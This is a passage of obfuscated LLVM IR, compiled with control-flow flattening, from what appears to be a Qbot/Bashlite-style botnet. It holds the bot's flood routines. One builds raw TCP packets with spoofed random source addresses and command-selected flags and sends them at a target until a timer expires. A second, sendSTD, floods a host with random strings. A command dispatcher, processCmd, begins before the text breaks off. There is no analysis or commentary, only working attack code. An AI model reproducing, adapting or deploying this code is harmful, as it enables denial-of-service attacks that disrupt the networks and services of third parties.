; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %8, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %43 = call i32 @getHost(i8* %41, %struct.in_addr* %42)
  %44 = icmp ne i32 %43, 0
  %45 = select i1 %44, i32 246053933, i32 1842487655
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 338350372, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %49 = getelementptr inbounds [8 x i8], [8 x i8]* %48, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %49, i8 0, i64 8, i32 4, i1 false)
  %50 = call i32 @socket(i32 2, i32 3, i32 6) #3
  store i32 %50, i32* %17, align 4
  %51 = load i32, i32* %17, align 4
  %52 = icmp ne i32 %51, 0
  %53 = select i1 %52, i32 -149334161, i32 566558591
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* @KadenCommStock, align 4
  %56 = call i32 (i32, i8*, ...) @botnetPrint(i32 %55, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.106, i32 0, i32 0))
  store i32 338350372, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  store i32 1, i32* %18, align 4
  %58 = load i32, i32* %17, align 4
  %59 = bitcast i32* %18 to i8*
  %60 = call i32 @setsockopt(i32 %58, i32 0, i32 3, i8* %59, i32 4) #3
  %61 = icmp slt i32 %60, 0
  %62 = select i1 %61, i32 -733754333, i32 1985424153
  store i32 %62, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i32, i32* @KadenCommStock, align 4
  %65 = call i32 (i32, i8*, ...) @botnetPrint(i32 %64, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.107, i32 0, i32 0))
  store i32 338350372, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %11, align 4
  %68 = icmp eq i32 %67, 0
  %69 = select i1 %68, i32 1279151815, i32 696613259
  store i32 %69, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  store i32 0, i32* %19, align 4
  store i32 315289700, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %11, align 4
  %73 = sub nsw i32 32, %72
  %74 = shl i32 1, %73
  %75 = sub nsw i32 %74, 1
  %76 = xor i32 %75, -1
  store i32 %76, i32* %19, align 4
  store i32 315289700, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  %78 = load i32, i32* %13, align 4
  %79 = sext i32 %78 to i64
  %80 = add i64 40, %79
  store i64 %80, i64* %.reg2mem2
  %81 = call i8* @llvm.stacksave()
  store i8* %81, i8** %20, align 8
  %.reload4 = load volatile i64, i64* %.reg2mem2
  %82 = alloca i8, i64 %.reload4, align 16
  store i8* %82, i8** %.reg2mem5
  %.reload9 = load volatile i8*, i8** %.reg2mem5
  %83 = bitcast i8* %.reload9 to %struct.iphdr*
  store %struct.iphdr* %83, %struct.iphdr** %21, align 8
  %84 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %85 = bitcast %struct.iphdr* %84 to i8*
  %86 = getelementptr i8, i8* %85, i64 20
  %87 = bitcast i8* %86 to %struct.tcphdr*
  store %struct.tcphdr* %87, %struct.tcphdr** %22, align 8
  %88 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %90 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %89, i32 0, i32 0
  %91 = load i32, i32* %90, align 4
  %92 = load i32, i32* %19, align 4
  %93 = call i32 @GRIP(i32 %92)
  %94 = call i32 @htonl(i32 %93) #10
  %95 = load i32, i32* %13, align 4
  %96 = sext i32 %95 to i64
  %97 = add i64 20, %96
  %98 = trunc i64 %97 to i32
  call void @makeIPPacket(%struct.iphdr* %88, i32 %91, i32 %94, i8 zeroext 6, i32 %98)
  %99 = call i32 @rand_cmwc()
  %100 = trunc i32 %99 to i16
  %101 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %102 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %101, i32 0, i32 0
  %103 = bitcast %union.anon* %102 to %struct.anon.0*
  %104 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %103, i32 0, i32 0
  store i16 %100, i16* %104, align 4
  %105 = call i32 @rand_cmwc()
  %106 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %107 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %106, i32 0, i32 0
  %108 = bitcast %union.anon* %107 to %struct.anon.0*
  %109 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %108, i32 0, i32 2
  store i32 %105, i32* %109, align 4
  %110 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %111 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %110, i32 0, i32 0
  %112 = bitcast %union.anon* %111 to %struct.anon.0*
  %113 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %112, i32 0, i32 3
  store i32 0, i32* %113, align 4
  %114 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %115 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %114, i32 0, i32 0
  %116 = bitcast %union.anon* %115 to %struct.anon.0*
  %117 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %116, i32 0, i32 4
  %118 = load i16, i16* %117, align 4
  %119 = and i16 %118, -241
  %120 = or i16 %119, 80
  store i16 %120, i16* %117, align 4
  %121 = load i8*, i8** %12, align 8
  %122 = call i32 @strcmp(i8* %121, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.108, i32 0, i32 0)) #9
  %123 = icmp ne i32 %122, 0
  %124 = select i1 %123, i32 632099092, i32 -2118564320
  store i32 %124, i32* %switchVar
  br label %loopEnd

; <label>:125:                                    ; preds = %loopEntry
  %126 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %127 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %126, i32 0, i32 0
  %128 = bitcast %union.anon* %127 to %struct.anon.0*
  %129 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %128, i32 0, i32 4
  %130 = load i16, i16* %129, align 4
  %131 = and i16 %130, -513
  %132 = or i16 %131, 512
  store i16 %132, i16* %129, align 4
  %133 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %134 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %133, i32 0, i32 0
  %135 = bitcast %union.anon* %134 to %struct.anon.0*
  %136 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %135, i32 0, i32 4
  %137 = load i16, i16* %136, align 4
  %138 = and i16 %137, -1025
  %139 = or i16 %138, 1024
  store i16 %139, i16* %136, align 4
  %140 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %141 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %140, i32 0, i32 0
  %142 = bitcast %union.anon* %141 to %struct.anon.0*
  %143 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %142, i32 0, i32 4
  %144 = load i16, i16* %143, align 4
  %145 = and i16 %144, -257
  %146 = or i16 %145, 256
  store i16 %146, i16* %143, align 4
  %147 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %148 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %147, i32 0, i32 0
  %149 = bitcast %union.anon* %148 to %struct.anon.0*
  %150 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %149, i32 0, i32 4
  %151 = load i16, i16* %150, align 4
  %152 = and i16 %151, -4097
  %153 = or i16 %152, 4096
  store i16 %153, i16* %150, align 4
  %154 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %155 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %154, i32 0, i32 0
  %156 = bitcast %union.anon* %155 to %struct.anon.0*
  %157 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %156, i32 0, i32 4
  %158 = load i16, i16* %157, align 4
  %159 = and i16 %158, -2049
  %160 = or i16 %159, 2048
  store i16 %160, i16* %157, align 4
  store i32 2080756218, i32* %switchVar
  br label %loopEnd

; <label>:161:                                    ; preds = %loopEntry
  %162 = load i8*, i8** %12, align 8
  %163 = call i8* @strtok(i8* %162, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #3
  store i8* %163, i8** %23, align 8
  store i32 819631171, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i8*, i8** %23, align 8
  %166 = icmp ne i8* %165, null
  %167 = select i1 %166, i32 39737409, i32 1220561747
  store i32 %167, i32* %switchVar
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  %169 = load i8*, i8** %23, align 8
  %170 = call i32 @strcmp(i8* %169, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.110, i32 0, i32 0)) #9
  %171 = icmp ne i32 %170, 0
  %172 = select i1 %171, i32 1634932635, i32 -1167303776
  store i32 %172, i32* %switchVar
  br label %loopEnd

; <label>:173:                                    ; preds = %loopEntry
  %174 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %175 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %174, i32 0, i32 0
  %176 = bitcast %union.anon* %175 to %struct.anon.0*
  %177 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %176, i32 0, i32 4
  %178 = load i16, i16* %177, align 4
  %179 = and i16 %178, -513
  %180 = or i16 %179, 512
  store i16 %180, i16* %177, align 4
  store i32 -931761141, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  %182 = load i8*, i8** %23, align 8
  %183 = call i32 @strcmp(i8* %182, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.111, i32 0, i32 0)) #9
  %184 = icmp ne i32 %183, 0
  %185 = select i1 %184, i32 -1677812574, i32 -1686469734
  store i32 %185, i32* %switchVar
  br label %loopEnd

; <label>:186:                                    ; preds = %loopEntry
  %187 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %188 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %187, i32 0, i32 0
  %189 = bitcast %union.anon* %188 to %struct.anon.0*
  %190 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %189, i32 0, i32 4
  %191 = load i16, i16* %190, align 4
  %192 = and i16 %191, -1025
  %193 = or i16 %192, 1024
  store i16 %193, i16* %190, align 4
  store i32 -757188779, i32* %switchVar
  br label %loopEnd

; <label>:194:                                    ; preds = %loopEntry
  %195 = load i8*, i8** %23, align 8
  %196 = call i32 @strcmp(i8* %195, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.112, i32 0, i32 0)) #9
  %197 = icmp ne i32 %196, 0
  %198 = select i1 %197, i32 -1162992177, i32 1402610445
  store i32 %198, i32* %switchVar
  br label %loopEnd

; <label>:199:                                    ; preds = %loopEntry
  %200 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %201 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %200, i32 0, i32 0
  %202 = bitcast %union.anon* %201 to %struct.anon.0*
  %203 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %202, i32 0, i32 4
  %204 = load i16, i16* %203, align 4
  %205 = and i16 %204, -257
  %206 = or i16 %205, 256
  store i16 %206, i16* %203, align 4
  store i32 -1297048117, i32* %switchVar
  br label %loopEnd

; <label>:207:                                    ; preds = %loopEntry
  %208 = load i8*, i8** %23, align 8
  %209 = call i32 @strcmp(i8* %208, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.113, i32 0, i32 0)) #9
  %210 = icmp ne i32 %209, 0
  %211 = select i1 %210, i32 -339525484, i32 -579598427
  store i32 %211, i32* %switchVar
  br label %loopEnd

; <label>:212:                                    ; preds = %loopEntry
  %213 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %214 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %213, i32 0, i32 0
  %215 = bitcast %union.anon* %214 to %struct.anon.0*
  %216 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %215, i32 0, i32 4
  %217 = load i16, i16* %216, align 4
  %218 = and i16 %217, -4097
  %219 = or i16 %218, 4096
  store i16 %219, i16* %216, align 4
  store i32 877003622, i32* %switchVar
  br label %loopEnd

; <label>:220:                                    ; preds = %loopEntry
  %221 = load i8*, i8** %23, align 8
  %222 = call i32 @strcmp(i8* %221, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.114, i32 0, i32 0)) #9
  %223 = icmp ne i32 %222, 0
  %224 = select i1 %223, i32 1526493667, i32 -1743886831
  store i32 %224, i32* %switchVar
  br label %loopEnd

; <label>:225:                                    ; preds = %loopEntry
  %226 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %227 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %226, i32 0, i32 0
  %228 = bitcast %union.anon* %227 to %struct.anon.0*
  %229 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %228, i32 0, i32 4
  %230 = load i16, i16* %229, align 4
  %231 = and i16 %230, -2049
  %232 = or i16 %231, 2048
  store i16 %232, i16* %229, align 4
  store i32 1365198170, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  %234 = load i32, i32* @KadenCommStock, align 4
  %235 = load i8*, i8** %23, align 8
  %236 = call i32 (i32, i8*, ...) @botnetPrint(i32 %234, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.115, i32 0, i32 0), i8* %235)
  store i32 1365198170, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  store i32 877003622, i32* %switchVar
  br label %loopEnd

; <label>:238:                                    ; preds = %loopEntry
  store i32 -1297048117, i32* %switchVar
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  store i32 -757188779, i32* %switchVar
  br label %loopEnd

; <label>:240:                                    ; preds = %loopEntry
  store i32 -931761141, i32* %switchVar
  br label %loopEnd

; <label>:241:                                    ; preds = %loopEntry
  %242 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #3
  store i8* %242, i8** %23, align 8
  store i32 819631171, i32* %switchVar
  br label %loopEnd

; <label>:243:                                    ; preds = %loopEntry
  store i32 2080756218, i32* %switchVar
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %245 = call i32 @rand_cmwc()
  %246 = trunc i32 %245 to i16
  %247 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %248 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %247, i32 0, i32 0
  %249 = bitcast %union.anon* %248 to %struct.anon.0*
  %250 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %249, i32 0, i32 5
  store i16 %246, i16* %250, align 2
  %251 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %252 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %251, i32 0, i32 0
  %253 = bitcast %union.anon* %252 to %struct.anon.0*
  %254 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %253, i32 0, i32 6
  store i16 0, i16* %254, align 4
  %255 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %256 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %255, i32 0, i32 0
  %257 = bitcast %union.anon* %256 to %struct.anon.0*
  %258 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %257, i32 0, i32 7
  store i16 0, i16* %258, align 2
  %259 = load i32, i32* %9, align 4
  %260 = icmp eq i32 %259, 0
  %261 = select i1 %260, i32 470277821, i32 -1933033872
  store i32 %261, i32* %switchVar
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  %263 = call i32 @rand_cmwc()
  store i32 -1143675765, i32* %switchVar
  store i32 %263, i32* %.reg2mem10
  br label %loopEnd

; <label>:264:                                    ; preds = %loopEntry
  %265 = load i32, i32* %9, align 4
  %266 = trunc i32 %265 to i16
  %267 = call zeroext i16 @htons(i16 zeroext %266) #10
  %268 = zext i16 %267 to i32
  store i32 -1143675765, i32* %switchVar
  store i32 %268, i32* %.reg2mem10
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  %270 = trunc i32 %.reload11 to i16
  %271 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %272 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %271, i32 0, i32 0
  %273 = bitcast %union.anon* %272 to %struct.anon.0*
  %274 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %273, i32 0, i32 1
  store i16 %270, i16* %274, align 2
  %275 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %276 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %277 = call zeroext i16 @tcpcsum(%struct.iphdr* %275, %struct.tcphdr* %276)
  %278 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %279 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %278, i32 0, i32 0
  %280 = bitcast %union.anon* %279 to %struct.anon.0*
  %281 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %280, i32 0, i32 6
  store i16 %277, i16* %281, align 4
  %.reload8 = load volatile i8*, i8** %.reg2mem5
  %282 = bitcast i8* %.reload8 to i16*
  %283 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %284 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %283, i32 0, i32 2
  %285 = load i16, i16* %284, align 2
  %286 = zext i16 %285 to i32
  %287 = call zeroext i16 @csum(i16* %282, i32 %286)
  %288 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %289 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %288, i32 0, i32 7
  store i16 %287, i16* %289, align 2
  %290 = call i64 @time(i64* null) #3
  %291 = load i32, i32* %10, align 4
  %292 = sext i32 %291 to i64
  %293 = add nsw i64 %290, %292
  %294 = trunc i64 %293 to i32
  store i32 %294, i32* %24, align 4
  store i32 0, i32* %25, align 4
  store i32 -480766125, i32* %switchVar
  br label %loopEnd

; <label>:295:                                    ; preds = %loopEntry
  store i32 744563781, i32* %switchVar
  br label %loopEnd

; <label>:296:                                    ; preds = %loopEntry
  %297 = load i32, i32* %17, align 4
  %298 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %.reload3 = load volatile i64, i64* %.reg2mem2
  %.reload7 = load volatile i8*, i8** %.reg2mem5
  %299 = call i64 @sendto(i32 %297, i8* %.reload7, i64 %.reload3, i32 0, %struct.sockaddr* %298, i32 16)
  %300 = load i32, i32* %19, align 4
  %301 = call i32 @GRIP(i32 %300)
  %302 = call i32 @htonl(i32 %301) #10
  %303 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %304 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %303, i32 0, i32 8
  store i32 %302, i32* %304, align 4
  %305 = call i32 @rand_cmwc()
  %306 = trunc i32 %305 to i16
  %307 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %308 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %307, i32 0, i32 3
  store i16 %306, i16* %308, align 4
  %309 = call i32 @rand_cmwc()
  %310 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %311 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %310, i32 0, i32 0
  %312 = bitcast %union.anon* %311 to %struct.anon.0*
  %313 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %312, i32 0, i32 2
  store i32 %309, i32* %313, align 4
  %314 = call i32 @rand_cmwc()
  %315 = trunc i32 %314 to i16
  %316 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %317 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %316, i32 0, i32 0
  %318 = bitcast %union.anon* %317 to %struct.anon.0*
  %319 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %318, i32 0, i32 0
  store i16 %315, i16* %319, align 4
  %320 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %321 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %320, i32 0, i32 0
  %322 = bitcast %union.anon* %321 to %struct.anon.0*
  %323 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %322, i32 0, i32 6
  store i16 0, i16* %323, align 4
  %324 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %325 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %326 = call zeroext i16 @tcpcsum(%struct.iphdr* %324, %struct.tcphdr* %325)
  %327 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %328 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %327, i32 0, i32 0
  %329 = bitcast %union.anon* %328 to %struct.anon.0*
  %330 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %329, i32 0, i32 6
  store i16 %326, i16* %330, align 4
  %.reload6 = load volatile i8*, i8** %.reg2mem5
  %331 = bitcast i8* %.reload6 to i16*
  %332 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %333 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %332, i32 0, i32 2
  %334 = load i16, i16* %333, align 2
  %335 = zext i16 %334 to i32
  %336 = call zeroext i16 @csum(i16* %331, i32 %335)
  %337 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %338 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %337, i32 0, i32 7
  store i16 %336, i16* %338, align 2
  %339 = load i32, i32* %25, align 4
  %340 = load i32, i32* %15, align 4
  %341 = icmp eq i32 %339, %340
  %342 = select i1 %341, i32 -532014488, i32 22357125
  store i32 %342, i32* %switchVar
  br label %loopEnd

; <label>:343:                                    ; preds = %loopEntry
  %344 = call i64 @time(i64* null) #3
  %345 = load i32, i32* %24, align 4
  %346 = sext i32 %345 to i64
  %347 = icmp sgt i64 %344, %346
  %348 = select i1 %347, i32 -823537740, i32 1411127008
  store i32 %348, i32* %switchVar
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  store i32 1910411002, i32* %switchVar
  br label %loopEnd

; <label>:350:                                    ; preds = %loopEntry
  store i32 0, i32* %25, align 4
  store i32 -480766125, i32* %switchVar
  br label %loopEnd

; <label>:351:                                    ; preds = %loopEntry
  %352 = load i32, i32* %25, align 4
  %353 = add i32 %352, 1
  store i32 %353, i32* %25, align 4
  store i32 -480766125, i32* %switchVar
  br label %loopEnd

; <label>:354:                                    ; preds = %loopEntry
  %355 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %355)
  store i32 338350372, i32* %switchVar
  br label %loopEnd

; <label>:356:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %354, %351, %350, %349, %343, %296, %295, %269, %264, %262, %244, %243, %241, %240, %239, %238, %237, %233, %225, %220, %212, %207, %199, %194, %186, %181, %173, %168, %164, %161, %125, %77, %71, %70, %66, %63, %57, %54, %47, %46, %40, %35, %31, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #5

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @sendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  %12 = alloca [36 x i8*], align 16
  %13 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %14 = call i32 @socket(i32 2, i32 2, i32 0) #3
  store i32 %14, i32* %7, align 4
  %15 = call i64 @time(i64* null) #3
  store i64 %15, i64* %8, align 8
  %16 = load i8*, i8** %4, align 8
  %17 = call %struct.hostent* @gethostbyname(i8* %16)
  store %struct.hostent* %17, %struct.hostent** %10, align 8
  %18 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 16, i32 4, i1 false)
  %19 = load %struct.hostent*, %struct.hostent** %10, align 8
  %20 = getelementptr inbounds %struct.hostent, %struct.hostent* %19, i32 0, i32 4
  %21 = load i8**, i8*** %20, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 0
  %23 = load i8*, i8** %22, align 8
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %25 = bitcast %struct.in_addr* %24 to i8*
  %26 = load %struct.hostent*, %struct.hostent** %10, align 8
  %27 = getelementptr inbounds %struct.hostent, %struct.hostent* %26, i32 0, i32 3
  %28 = load i32, i32* %27, align 4
  %29 = sext i32 %28 to i64
  call void @bcopy(i8* %23, i8* %25, i64 %29) #3
  %30 = load %struct.hostent*, %struct.hostent** %10, align 8
  %31 = getelementptr inbounds %struct.hostent, %struct.hostent* %30, i32 0, i32 2
  %32 = load i32, i32* %31, align 8
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %33, i16* %34, align 4
  %35 = load i32, i32* %5, align 4
  %36 = trunc i32 %35 to i16
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %36, i16* %37, align 2
  store i32 0, i32* %11, align 4
  %switchVar = alloca i32
  store i32 -2018954638, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -2018954638, label %38
    i32 -1984046723, label %48
    i32 945350332, label %62
    i32 1901844048, label %65
    i32 1816836103, label %66
    i32 1834887153, label %69
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = bitcast [36 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %39, i8* bitcast ([36 x i8*]* @sendSTD.randstrings to i8*), i64 288, i32 16, i1 false)
  %40 = call i32 @rand() #3
  %41 = sext i32 %40 to i64
  %42 = urem i64 %41, 36
  %43 = getelementptr inbounds [36 x i8*], [36 x i8*]* %12, i64 0, i64 %42
  %44 = load i8*, i8** %43, align 8
  store i8* %44, i8** %13, align 8
  %45 = load i32, i32* %11, align 4
  %46 = icmp uge i32 %45, 50
  %47 = select i1 %46, i32 -1984046723, i32 1816836103
  store i32 %47, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i32, i32* %7, align 4
  %50 = load i8*, i8** %13, align 8
  %51 = call i64 @send(i32 %49, i8* %50, i64 69, i32 0)
  %52 = load i32, i32* %7, align 4
  %53 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %54 = call i32 @connect(i32 %52, %struct.sockaddr* %53, i32 16)
  %55 = call i64 @time(i64* null) #3
  %56 = load i64, i64* %8, align 8
  %57 = load i32, i32* %6, align 4
  %58 = sext i32 %57 to i64
  %59 = add nsw i64 %56, %58
  %60 = icmp sge i64 %55, %59
  %61 = select i1 %60, i32 945350332, i32 1901844048
  store i32 %61, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i32, i32* %7, align 4
  %64 = call i32 @close(i32 %63)
  call void @_exit(i32 0) #12
  unreachable

; <label>:65:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 1816836103, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %11, align 4
  %68 = add i32 %67, 1
  store i32 %68, i32* %11, align 4
  store i32 -2018954638, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %66, %65, %48, %38, %switchDefault
  br label %loopEntry
}

; Function Attrs: noreturn
declare void @_exit(i32) #8

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %31 = load i8**, i8*** %4, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 0
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 @strcmp(i8* %33, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.152, i32 0, i32 0)) #9
  store i32 %34, i32* %.reg2mem
  %switchVar = alloca i32
